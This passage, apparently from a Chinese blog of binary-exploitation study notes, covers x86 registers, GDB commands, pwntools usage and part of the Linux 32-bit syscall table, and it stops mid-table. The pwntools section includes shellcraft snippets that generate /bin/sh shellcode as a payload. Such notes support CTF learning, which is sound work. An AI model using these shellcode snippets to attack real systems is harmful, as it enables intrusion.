class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword   双字 就是四个字节</span><br><span class="line">ptr     pointer缩写 即指针</span><br><span class="line">[]里的数据是一个地址值，这个地址指向一个双字型数据</span><br><span class="line">比如mov eax, dword ptr [12345678]  把内存地址12345678中的双字型（32位）数据赋给eax</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/kaiwii/article/details/7385929"> 关于dword ptr 指令的意思_Kaiwii的博客-CSDN博客_ptr指令</a></p><br/><h2 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push    <span class="comment">#先减esp，再压入</span></span><br><span class="line">pop     <span class="comment">#先取数据再增esp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相关链接：</p><p>push/pop：<a href="https://blog.csdn.net/cherisegege/article/details/79834390">8086汇编基础 push,pop指令执行时，sp怎么变_cherisegege的博客-CSDN博客_pop指令过后sp怎么变</a></p><p>retn/call/leave：<a href="https://blog.csdn.net/comeonow/article/details/81355924">执行retn、call、leave指令的时候，esp和eip的变化情况_comeonow的博客-CSDN博客</a></p><br/><br/><h1 id="linux字符"><a href="#linux字符" class="headerlink" title="linux字符"></a>linux字符</h1><p>链接：<a href="https://zhuanlan.zhihu.com/p/96272363">Linux通配符讲解 - 知乎 (zhihu.com)</a></p><h1 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">n    <span class="comment">#执行一行源代码但不进入函数内部</span></span><br><span class="line"></span><br><span class="line">ni    <span class="comment">#执行一行汇编代码但不进入函数内部</span></span><br><span class="line"></span><br><span class="line">s    <span class="comment">#执行一行源代码而且进入函数内部</span></span><br><span class="line"></span><br><span class="line">si    <span class="comment">#执行一行汇编代码而且进入函数内部</span></span><br><span class="line"></span><br><span class="line">c            <span class="comment">#继续执行到下一个断点</span></span><br><span class="line"></span><br><span class="line">b *&lt;地址&gt;    <span class="comment">#下断点</span></span><br><span class="line"></span><br><span class="line">stack       <span class="comment">#显示栈信息</span></span><br><span class="line"></span><br><span class="line">finish      <span class="comment">#结束当前运行函数</span></span><br><span class="line"></span><br><span class="line">x           <span class="comment">#按十六进制格式显示内存数据，其中x/&#123;字节数&#125;x 以16进制显示指定地址处的数据;</span></span><br><span class="line">            <span class="comment">#&#123;字节数&#125;表示字节数制定（b 单字节；h 双字节；w 四字节；g 八字节；默认为四字节）</span></span><br><span class="line"></span><br><span class="line">disas/disassemble (函数名)      <span class="comment">#将函数整个流程的汇编显示出来。</span></span><br><span class="line"></span><br><span class="line">i           <span class="comment">#info，查看一些信息，只输入info可以看可以接什么参数，下面几个比较常用</span></span><br><span class="line"></span><br><span class="line">i b         <span class="comment">#info break 查看所有断点信息（编号、断点位置）</span></span><br><span class="line">i r         <span class="comment">#info registers 查看各个寄存器当前的值</span></span><br><span class="line">i f         <span class="comment">#info function 查看所有函数名，需保留符号</span></span><br><span class="line"></span><br><span class="line">vmmap       <span class="comment">#查看当前程序映射的内存块</span></span><br></pre></td></tr></table></figure><p> <strong>查看内存指令x：</strong></p><ul><li><code>x /nuf 0x123456</code> //常用，x指令的格式是：<code>x/nfu</code>，<code>nfu</code>代表三个参数</li><li>n代表<strong>显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节）</strong>，放在’/‘后面</li><li>u代表一个单元几个字节，b(一个字节)，h(俩字节)，w(四字节)，g(八字节)</li><li>f代表显示数据的格式，<strong>f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x 按十六进制格式显示变量。</span><br><span class="line">d 按十进制格式显示变量。</span><br><span class="line">u 按十六进制格式显示无符号整型。</span><br><span class="line">o 按八进制格式显示变量。</span><br><span class="line">t 按二进制格式显示变量。</span><br><span class="line">a 按十六进制格式显示变量。</span><br><span class="line">c 按字符格式显示变量。</span><br><span class="line">f 按浮点数格式显示变量。</span><br><span class="line">s 按字符串显示。</span><br><span class="line">b按字符显示。</span><br><span class="line">i显示汇编指令。</span><br></pre></td></tr></table></figure><ul><li>x /10gx 0x123456 //<strong>常用</strong>，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</li><li>x /10xd $rdi //从<strong>rdi指向的地址向后</strong>打印10个单元，每个单元4字节的十进制数</li><li>x /10i 0x123456 //<strong>常用</strong>，从0x123456处向后显示十条汇编指令</li></ul><p>例：$ x/136wx 0x7fffffffdf08</p><br/><p>链接：<a href="https://blog.csdn.net/weixin_30697239/article/details/101103647">https://blog.csdn.net/weixin_30697239/article/details/101103647</a></p><br/><br/><h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python             #python语言标记</span></span><br><span class="line">from pwn import *                 <span class="comment">#导入所有模块</span></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-     or    # coding:utf-8 </span></span><br><span class="line"></span><br><span class="line">连接：</span><br><span class="line">sh = porcess(<span class="string">&quot;./level0&quot;</span>)          <span class="comment">#本地</span></span><br><span class="line">sh = remote(<span class="string">&quot;127.0.0.1&quot;</span>,10001)    <span class="comment">#远程</span></span><br><span class="line">sh.close()                        <span class="comment">#关闭连接</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IO模块：</span><br><span class="line">sh.send(data)                     <span class="comment">#发送数据</span></span><br><span class="line">sh.sendline(data)    <span class="comment">#发送一行数据，相当于在数据后面加\n</span></span><br><span class="line">sh.recv(numb = 2048, timeout = dufault)     <span class="comment">#接受数据，numb指定接收的字节，timeout指定超时</span></span><br><span class="line">sh.recvline(keepends=True)                  <span class="comment">#接受一行数据，keepends为是否保留行尾的\n</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Hello,World\n&quot;</span>,drop=fasle)    <span class="comment">#接受数据直到我们设置的标志出现</span></span><br><span class="line">sh.recvall()                      <span class="comment">#一直接收直到EOF</span></span><br><span class="line">sh.recvrepeat(timeout = default)  <span class="comment">#持续接受直到EOF或timeout</span></span><br><span class="line">sh.interactive()                  <span class="comment">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Shellcode生成器：</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> shellcraft.i386.nop().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    nop</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> shellcraft.i386.linux.sh()</span><br><span class="line">    /* push <span class="string">&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">...</span><br><span class="line"><span class="comment">#结合asm可以可以得到最终的pyaload</span></span><br><span class="line">from pwn import *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">或者</span><br><span class="line">from pwn import *</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">暂时只记这些</span><br></pre></td></tr></table></figure><br/><p>pwntools手册链接(复杂):<a href="https://pwntoolsdocinzh-cn.readthedocs.io/en/master/intro.html">开始使用 — pwntools 3.5.0 documentation (pwntoolsdocinzh-cn.readthedocs.io)</a></p><p>链接：<a href="https://www.jianshu.com/p/355e4badab50">pwntools使用 - 简书 (jianshu.com)</a></p><p>链接：<a href="https://ch4r1l3.github.io/2018/07/19/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E5%9B%9B%E7%AB%A0%E2%80%94%E2%80%94pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">cyclic</a></p><br/><br/><h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">1、应用程序调用库函数（API）；</span><br><span class="line">2、API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</span><br><span class="line">3、内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</span><br><span class="line">4、系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</span><br><span class="line">5、中断处理函数返回到 API 中；</span><br><span class="line">6、API 将 EAX 返回给应用程序。</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">movl <span class="variable">$0</span>, %ebx</span><br><span class="line">movl <span class="variable">$1</span>, %eax</span><br><span class="line">int <span class="variable">$0x80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">linux 系统调用号表：</span><br><span class="line">原文链接：https://blog.csdn.net/qq_29343201/article/details/52209588</span><br><span class="line"></span><br><span class="line">32位：</span><br><span class="line"><span class="comment">#ifndef _ASM_X86_UNISTD_32_H</span></span><br><span class="line"><span class="comment">#define _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line">        <span class="comment">#define __NR_restart_syscall 0</span></span><br><span class="line">        <span class="comment">#define __NR_exit 1</span></span><br><span class="line">        <span class="comment">#define __NR_fork 2</span></span><br><span class="line">        <span class="comment">#define __NR_read 3</span></span><br><span class="line">        <span class="comment">#define __NR_write 4</span></span><br><span class="line">        <span class="comment">#define __NR_open 5</span></span><br><span class="line">        <span class="comment">#define __NR_close 6</span></span><br><span class="line">        <span class="comment">#define __NR_waitpid 7</span></span><br><span class="line">        <span class="comment">#define __NR_creat 8</span></span><br><span class="line">        <span class="comment">#define __NR_link 9</span></span><br><span class="line">        <span class="comment">#define __NR_unlink 10</span></span><br><span class="line">        <span class="comment">#define __NR_execve 11</span></span><br><span class="line">        <span class="comment">#define __NR_chdir 12</span></span><br><span class="line">        <span class="comment">#define __NR_time 13</span></span><br><span class="line">        <span class="comment">#define __NR_mknod 14</span></span><br><span class="line">        <span class="comment">#define __NR_chmod 15</span></span><br><span class="line">        <span class="comment">#define __NR_lchown 16</span></span><br><span class="line">        <span class="comment">#define __NR_break 17</span></span><br><span class="line">        <span class="comment">#define __NR_oldstat 18</span></span><br><span class="line">        <span class="comment">#define __NR_lseek 19</span></span><br><span class="line">        <span class="comment">#define __NR_getpid 20</span></span><br><span class="line">        <span class="comment">#define __NR_mount 21</span></span><br><span class="line">        <span class="comment">#define __NR_umount 22</span></span><br><span class="line">        <span class="comment">#define __NR_setuid 23</span></span><br><span class="line">        <span class="comment">#define __NR_getuid 24</span></span><br><span class="line">        <span class="comment">#define __NR_stime 25</span></span><br><span class="line">        <span class="comment">#define __NR_ptrace 26</span></span><br><span class="line">        <span class="comment">#define __NR_alarm 27</span></span><br><span class="line">        <span class="comment">#define __NR_oldfstat 28</span></span><br><span class="line">        <span class="comment">#define __NR_pause 29</span></span><br><span class="line">        <span class="comment">#define __NR_utime 30</span></span><br><span class="line">        <span class="comment">#define __NR_stty 31</span></span><br><span class="line">        <span class="comment">#define __NR_gtty 32</span></span><br><span class="line">        <span class="comment">#define __NR_access 33</span></span><br><span class="line">        <span class="comment">#define __NR_nice 34</span></span><br><span class="line">        <span 